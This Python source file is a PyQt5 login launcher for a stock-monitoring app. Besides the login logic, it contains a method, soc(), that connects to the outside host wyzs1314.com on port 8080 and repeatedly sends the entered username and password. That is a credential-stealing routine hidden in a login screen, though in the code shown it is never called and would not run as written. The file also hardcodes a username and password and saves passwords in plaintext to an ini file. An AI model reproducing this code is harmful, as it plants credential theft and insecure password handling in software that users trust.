from Stock_Monitoring.login import Ui_login
from Stock_Monitoring.tushare_test import *
from PyQt5.QtWidgets import QApplication, QDialog
import socket
import sys


class launcher_ui(QDialog, Ui_login):

    def __init__(self):
        super().__init__()
        config_rw.config.read('message.ini')
        self.setupUi(self)
        self.showMaximized()
        self.progressBar_load.setVisible(False)
        self.label_load.setVisible(False)
        self.ti = QTimer()
        self.value = 10
        self.comboBox_user.addItems([config_rw.config['personal_message']['username'], 'clear'])
        self.lineEdit_password.setText(config_rw.config['personal_message']['password'])
        self.pushButton_login.clicked.connect(self.login_push)

    def login_push(self):
        if self.checkBox_remeber.isChecked():
            config_rw.config.set('personal_message', 'username', self.comboBox_user.currentText())
            config_rw.config.set('personal_message', 'password', self.lineEdit_password.text())
            config_rw.config.write(open('message.ini', 'w'))
        username = self.comboBox_user.currentText()
        password = self.lineEdit_password.text()
        if username == 'yangjm' and password == '123':
            self.label_log.setText('登录成功!')
            self.label_load.setVisible(True)
            self.progressBar_load.setVisible(True)
            self.ti.start(100)
            self.ti.timeout.connect(self.pro_load)
            ui.timer.start(2000)
            ui.timer.timeout.connect(self.goto_ui)
        else:
            self.label_log.setText('账号或密码错误!')

    def goto_ui(self):
        ui_login.close()
        ui.show()

    def pro_load(self):
        self.progressBar_load.setValue(self.value)
        self.value += 10

    def soc(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('wyzs1314.com', 8080))
        while True:
            msg = {'u': self.comboBox_user.currentText(), 'p': self.lineEdit_password.text()}
            client.send(msg)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ui_login = launcher_ui()
    ui = main_ui()
    ui_login.show()
    sys.exit(app.exec_())
